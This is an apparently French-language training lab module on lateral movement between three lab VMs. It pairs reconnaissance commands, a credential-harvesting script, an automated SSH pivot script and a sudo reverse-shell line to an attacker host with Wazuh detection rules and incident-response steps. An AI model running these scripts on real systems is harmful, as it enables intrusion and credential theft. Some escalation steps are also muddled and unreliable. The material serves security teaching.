# 08 – Mouvement Latéral & Accès Réseau
**Durée estimée** : 2h | **Niveau** : Avancé | **Prérequis** : 05_escalade_privileges.md, 07_cve.md

---

## 🎯 Objectif

Une fois accès obtenu sur **VM1 (Serveur web)**, utiliser cet accès pour accéder à **VM2 (SOC/Logs)** et **VM3 (Monitoring)**.

Le mouvement latéral est la transition entre systèmes une fois foothold établi.

**Compétences validées** :
- Reconnaissance intra-réseau
- Exploitation de credentials récupérés
- Pivoting réseau
- Detection de mouvement latéral
- Escalade inter-système

---

## 📋 Concepts clés

### Stratégie de mouvement latéral

```
┌─────────────────────────────────────────────┐
│         Internet / Attaquant                │
└────────────┬────────────────────────────────┘
             │ Compromise VM1
             ▼
   ┌──────────────────────┐
   │   VM1 (Compromised)  │ ← Foothold
   │  (Web Server)        │
   └──────────┬───────────┘
              │ Reconnaissance
              │ (hosts, credentials, SSH keys)
              ▼
   ┌──────────────────────────────────────┐
   │  VM2 (SOC) - 192.168.1.20           │ ← Lateral Move
   │  VM3 (Monitoring) - 192.168.1.30    │   (reuse credentials)
   └──────────────────────────────────────┘
```

### Étapes du mouvement latéral

1. **Enumeration** : Trouver les autres systèmes sur le réseau
2. **Reconnaissance** : Identifier les credentials/clés SSH
3. **Exploitation** : Utiliser credentials pour accéder à d'autres VM
4. **Persistence** : Établir un nouvel accès persistant
5. **Escalade** : Répéter le processus sur VM2 et VM3

---

## 🔍 Étape 1 – Reconnaissance intra-réseau (depuis VM1 compromise)

### 1.1 – Découvrir les autres hôtes

**Depuis un shell sur VM1** (après obtention accès via 05 ou 06) :

```bash
# Afficher la configuration réseau locale
ifconfig
# Ou :
ip addr show

# Output (exemple)
eth0: flags=UP,BROADCAST,RUNNING,MULTICAST  mtu 1500
    inet 192.168.1.10 netmask 255.255.255.0 broadcast 192.168.1.255
```

**Identifier le range réseau** : `192.168.1.0/24`

### 1.2 – Scan réseau depuis VM1

```bash
# Option 1 : Nmap (si installé)
nmap -sn 192.168.1.0/24
# Output (exemple)
# 192.168.1.1    - Routeur
# 192.168.1.10   - VM1 (self)
# 192.168.1.20   - VM2 (SOC) ← Target
# 192.168.1.30   - VM3 (Monitoring) ← Target
# 192.168.1.5    - Kali (attacker)

# Option 2 : Sans Nmap - Bash ping loop
for i in {1..254}; do
  ping -c 1 192.168.1.$i 2>/dev/null &
done
wait

# Option 3 : arp-scan (si disponible)
arp-scan 192.168.1.0/24
```

### 1.3 – Reconnaissance des services accessibles

```bash
# Depuis VM1, tester connectivité vers VM2 et VM3
nc -zv 192.168.1.20 22  # SSH port
nc -zv 192.168.1.30 22

# Output (exemple)
# Connection to 192.168.1.20 22 port [tcp/ssh] succeeded!
# Connection to 192.168.1.30 22 port [tcp/ssh] succeeded!

# Alternative (sans netcat) :
ssh -o ConnectTimeout=2 user@192.168.1.20 "echo OK"
ssh -o ConnectTimeout=2 user@192.168.1.30 "echo OK"
```

---

## 🔑 Étape 2 – Récupération de credentials/clés SSH

### 2.1 – Chercher des clés SSH

**Depuis un shell sur VM1 compromise** :

```bash
# Chercher les clés SSH
find /home -name "id_rsa" 2>/dev/null
find /home -name "id_dsa" 2>/dev/null
find /home -name "id_ecdsa" 2>/dev/null

# Output (exemple)
# /home/admin/.ssh/id_rsa ← Found!

# Vérifier les permissions
ls -la /home/admin/.ssh/
# -rw------- 1 admin admin 1827 Jan 15 14:25 id_rsa

# Lire la clé
cat /home/admin/.ssh/id_rsa
```

### 2.2 – Chercher des passwords/config hardcodes

```bash
# Dans les fichiers de config web
grep -r "password\|passwd\|pwd" /var/www/ 2>/dev/null

# Exemple : Credentials dans une config PHP
grep -r "DATABASE_PASSWORD\|DB_PASS" /var/www/ 2>/dev/null

# Output (exemple)
# /var/www/config.php: define('DB_PASS', 'admin123456');
# /var/www/app/.env: SSH_USER=admin SSH_PASS=admin123456

# Chercher dans l'historique bash
cat ~/.bash_history | grep -i "password\|ssh\|scp"

# Output (exemple)
# ssh admin@192.168.1.20
# scp file.txt admin@192.168.1.20:/tmp
```

### 2.3 – Chercher dans fichiers historique et configs

```bash
# Fichiers .ssh/config
cat ~/.ssh/config
# Output (exemple)
# Host vm2
#   HostName 192.168.1.20
#   User admin
#   IdentityFile ~/.ssh/id_rsa

# Fichiers .bashrc / .zshrc
grep -i "alias\|ssh\|password" ~/.bashrc ~/.zshrc 2>/dev/null
```

### 2.4 – Extraire les credentials trouvés

**Créer un script d'extraction** :

```bash
#!/bin/bash
# extract_creds.sh - Chercher les credentials sur VM1 compromise

echo "=== SSH Keys ===" 
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null

echo ""
echo "=== Config Files ===" 
grep -r "password\|passwd\|pwd\|ssh" /var/www /etc/app* 2>/dev/null | grep -v "^Binary"

echo ""
echo "=== Bash History ===" 
cat ~/.bash_history | grep -E "ssh|scp|password" | head -10

echo ""
echo "=== SSH Config ===" 
cat ~/.ssh/config 2>/dev/null

echo ""
echo "=== /etc/passwd (users list) ===" 
cat /etc/passwd | grep "/bin/bash"
```

**Lancer** :

```bash
bash extract_creds.sh > /tmp/creds_found.txt
cat /tmp/creds_found.txt
```

---

## 🔐 Étape 3 – Exploitation des credentials (accès à VM2 et VM3)

### 3.1 – Accès SSH avec clé SSH trouvée

**Depuis VM1 compromise** :

```bash
# Copier la clé trouvée
SSH_KEY=$(cat /home/admin/.ssh/id_rsa)

# Accéder à VM2 (SOC) avec la clé
ssh -i /home/admin/.ssh/id_rsa admin@192.168.1.20

# Si demande passphrase, la clé pourrait être protégée
# → Ignorer et utiliser password au lieu

# Verify access to VM2
whoami
hostname
```

### 3.2 – Accès SSH avec password

```bash
# Si credential password trouvé : admin:admin123456
ssh admin@192.168.1.20
# Prompt : admin@192.168.1.20's password: admin123456

# Verify access
whoami  # Output: admin
hostname  # Output: soc-vm
```

### 3.3 – Test de spread (mouvement de VM1 à VM2)

**Depuis VM1, créer un script d'accès automatisé** :

```bash
#!/bin/bash
# lateral_move.sh - Accès automatisé aux VM2 et VM3

VM2_IP="192.168.1.20"
VM3_IP="192.168.1.30"
USER="admin"
SSH_KEY="/home/admin/.ssh/id_rsa"

echo "[*] Attempting lateral movement..."

# Test VM2
echo "[+] Connecting to VM2 (SOC)..."
ssh -i $SSH_KEY $USER@$VM2_IP "whoami; hostname; id" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] SUCCESS: Access to VM2 gained"
else
    echo "[-] FAILED: Cannot access VM2"
fi

# Test VM3
echo "[+] Connecting to VM3 (Monitoring)..."
ssh -i $SSH_KEY $USER@$VM3_IP "whoami; hostname; id" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] SUCCESS: Access to VM3 gained"
else
    echo "[-] FAILED: Cannot access VM3"
fi
```

**Lancer** :

```bash
chmod +x lateral_move.sh
./lateral_move.sh
```

---

## 💉 Étape 4 – Escalade de privilèges sur VM2 et VM3

### 4.1 – Reconnaître VM2 et VM3 une fois accès établi

```bash
# SSH dans VM2
ssh admin@192.168.1.20

# Une fois connecté :
whoami  # Output: admin
id      # Output: uid=1000(admin) gid=1000(admin)

# Vérifier les permissions sudo
sudo -l
# Output (exemple):
# Matching Defaults entries for admin on soc-vm:
#     requiretty, !visiblepw, always_set_home, env_reset
# User admin may run the following commands on soc-vm:
#     (ALL) NOPASSWD: /bin/systemctl

# Exploiter les permissions sudo
sudo /bin/systemctl status wazuh-manager
```

### 4.2 – Escalade vers root

```bash
# Chercher vulnérabilités sudo
sudo -l | grep NOPASSWD

# Exploiter (exemple : /bin/systemctl sans password)
sudo /bin/systemctl
# Ou : sudo /bin/bash (si possible)

# Vérifier si root access obtenu
sudo su -
# Prompt: root@soc-vm:~#
whoami  # Output: root
```

### 4.3 – Script d'escalade automatisée

```bash
#!/bin/bash
# escalate_vm2_vm3.sh - Escalade de privilèges sur VM2 et VM3

escalate_and_persist() {
    local VM_IP=$1
    local VM_NAME=$2
    
    echo "[*] Attempting escalation on $VM_NAME ($VM_IP)..."
    
    # Chercher les permissions sudo
    ssh admin@$VM_IP "sudo -l 2>/dev/null | grep NOPASSWD"
    
    # Si systemctl disponible sans password
    ssh admin@$VM_IP "sudo /bin/bash -i >& /dev/tcp/192.168.1.5/5555 0>&1 &"
    
    echo "[+] Escalation attempted on $VM_NAME"
}

# Escalader VM2 et VM3
escalate_and_persist "192.168.1.20" "VM2_SOC"
escalate_and_persist "192.168.1.30" "VM3_MONITORING"
```

---

## 🔍 Étape 5 – Détection du mouvement latéral via Wazuh

### 5.1 – Logs SSH générés

Sur **VM2 et VM3**, les connexions SSH depuis VM1 sont loggées :

```bash
# Sur VM2 ou VM3
tail -20 /var/log/secure | grep "sshd"

# Output (exemple)
# Feb 10 15:30:15 soc-vm sshd[8234]: Accepted publickey for admin from 192.168.1.10 port 52341
# Feb 10 15:30:16 soc-vm sshd[8234]: pam_unix(sshd:session): session opened for user admin
```

### 5.2 – Logs d'escalade de privilèges

```bash
# Tentatives sudo
tail -20 /var/log/secure | grep "sudo"

# Output (exemple)
# Feb 10 15:30:45 soc-vm sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
# Feb 10 15:30:46 soc-vm sudo: pam_unix(sudo-l:auth): conversation failed
```

### 5.3 – Règles Wazuh pour détection mouvement latéral

Ajouter dans `/var/ossec/etc/rules/local_rules.xml` sur VM2 (SOC) :

```xml
<!-- Lateral Movement Detection Rules -->

<!-- SSH Login from Internal Network (Suspicious) -->
<rule id="200301" level="6">
    <if_sid>5715</if_sid>
    <srcip>192.168.1.</srcip>
    <description>SSH login from internal IP (possible lateral movement)</description>
    <group>lateral_movement</group>
</rule>

<!-- SSH with Key-based Auth (suspicious pattern) -->
<rule id="200302" level="7">
    <if_sid>5715</if_sid>
    <match>Accepted publickey</match>
    <description>SSH with public key authentication (possible lateral movement)</description>
    <group>lateral_movement</group>
</rule>

<!-- Sudo escalation attempts -->
<rule id="200303" level="8">
    <if_sid>5402</if_sid>
    <match>sudo.*COMMAND</match>
    <description>Sudo command execution (possible privilege escalation)</description>
    <group>lateral_movement</group>
</rule>

<!-- Multiple failed SSH logins from VM1 -->
<rule id="200304" level="9">
    <if_sid>5716</if_sid>
    <srcip>192.168.1.10</srcip>
    <frequency>
        <entries_within_time>2m</entries_within_time>
        <timeframe>5m</timeframe>
        <ignore_repetitions>3</ignore_repetitions>
    </frequency>
    <description>Multiple SSH login failures from VM1 (lateral movement attempt)</description>
    <group>lateral_movement</group>
</rule>
```

**Redémarrer Wazuh** :

```bash
sudo systemctl restart wazuh-manager
```

### 5.4 – Vérifier les alertes

```bash
# Via CLI
grep "lateral_movement" /var/ossec/logs/alerts/alerts.json | jq '.rule.description'

# Via Wazuh Web UI
# Threat Detection → Events → Filter: group="lateral_movement"
```

---

## 🛡️ Étape 6 – Réaction (Incident Response)

### 6.1 – Identifier les connexions suspectes

```bash
# Sur VM2 et VM3, identifier connexions de VM1
lastlog | grep admin
# Ou :
who

# Vérifier les sessions SSH actives
ps aux | grep sshd | grep admin
```

### 6.2 – Killer les sessions SSH suspectes

```bash
# Lister les connexions SSH
ss -tuln | grep ssh
netstat -tuln | grep ssh

# Identifier le PID de la session suspecte
ps aux | grep "admin.*sshd"
# Output: root 8234 ... sshd: admin [priv]

# Tuer la session
kill -9 8234
```

### 6.3 – Renforcer l'accès inter-VM

**Changer le password de admin** :

```bash
# Sur VM2 et VM3
sudo passwd admin
# Nouveau password: StrongPassword123!

# Désactiver la clé SSH (si compromise)
rm ~/.ssh/authorized_keys
```

**Désactiver SSH depuis le réseau interne** (firewall) :

```bash
# Sur VM2 et VM3, ajouter une règle firewall
sudo firewall-cmd --permanent --add-rich-rule="rule family='ipv4' source address='192.168.1.10' port protocol='tcp' port='22' drop"
sudo firewall-cmd --reload
```

### 6.4 – Audit complet du mouvement latéral

**Script d'audit** :

```bash
#!/bin/bash
# audit_lateral_movement.sh

echo "=== SSH Logins from Internal IPs ==="
grep "Accepted.*192.168.1" /var/log/secure | tail -10

echo ""
echo "=== Sudo Executions ==="
grep "sudo.*COMMAND" /var/log/secure | tail -10

echo ""
echo "=== SSH Key-based Authentications ==="
grep "Accepted publickey" /var/log/secure | tail -10

echo ""
echo "=== Failed Login Attempts ==="
grep "Failed password.*192.168.1" /var/log/secure | wc -l

echo ""
echo "=== Timeline of Lateral Movement ==="
grep "admin.*sshd\|sudo" /var/log/secure | head -20
```

**Lancer** :

```bash
chmod +x audit_lateral_movement.sh
./audit_lateral_movement.sh
```

---

## ✅ Vérifications et tests

### Checklist d'exécution

**Reconnaissance** :
- [ ] Réseau interne énuméré (nmap/arp-scan)
- [ ] VM2 et VM3 identifiées
- [ ] Ports SSH accessibles sur VM2 et VM3

**Récupération de credentials** :
- [ ] Clés SSH localisées sur VM1
- [ ] Passwords trouvés dans configs
- [ ] Bash history analysée

**Exploitation** :
- [ ] Accès SSH établi à VM2 avec clé
- [ ] Accès SSH établi à VM3 avec clé
- [ ] Permissions sudoers vérifiées sur VM2 et VM3

**Escalade** :
- [ ] Escalade de privilèges effectuée sur VM2
- [ ] Escalade de privilèges effectuée sur VM3
- [ ] Access root obtenu sur VM2 et VM3

**Détection** :
- [ ] Logs SSH sur VM2 et VM3 vérifiés
- [ ] Logs sudo consultés
- [ ] Alertes Wazuh générées et détectées
- [ ] Règles personnalisées testées

**Réaction** :
- [ ] Sessions SSH tuées
- [ ] Passwords changés
- [ ] Firewall rules appliquées
- [ ] Audit complet effectué

### Preuves à documenter

**Capture 1** : Énumération réseau
```bash
nmap -sn 192.168.1.0/24
```

**Capture 2** : Clés SSH trouvées
```bash
cat /home/admin/.ssh/id_rsa
```

**Capture 3** : Accès réussi à VM2
```bash
ssh -i /home/admin/.ssh/id_rsa admin@192.168.1.20
whoami && hostname
```

**Capture 4** : Escalade sudo
```bash
sudo -l
sudo /bin/bash
```

**Capture 5** : Logs SSH sur VM2
```bash
tail -20 /var/log/secure | grep "admin"
```

**Capture 6** : Alerte Wazuh
```
Screenshot de la détection de mouvement latéral
```

**Capture 7** : Réaction (blocage firewall)
```bash
sudo firewall-cmd --list-all | grep rule
```

---

## 📚 Ressources et références

- **SSH Hardening** : https://man7.org/linux/man-pages/man5/sshd_config.5.html
- **Sudo Security** : https://www.sudo.ws/
- **Firewall-cmd** : https://firewalld.org/

---

## 🎓 Résumé des apprentissages

| Phase | Détail |
|-------|--------|
| **Reconnaissance** | Énumération réseau, découverte d'hôtes |
| **Credentials** | Extraction de clés SSH, passwords |
| **Exploitation** | SSH avec credentials récupérés |
| **Escalade** | Sudo, élévation de privilèges |
| **Detection** | Logs SSH, Wazuh rules, alertes |
| **Réaction** | Kill sessions, changement passwords, firewall |

Ce module teste la capacité à progresser à travers une infrastructure et la détection SOC du mouvement latéral d'un attaquant.
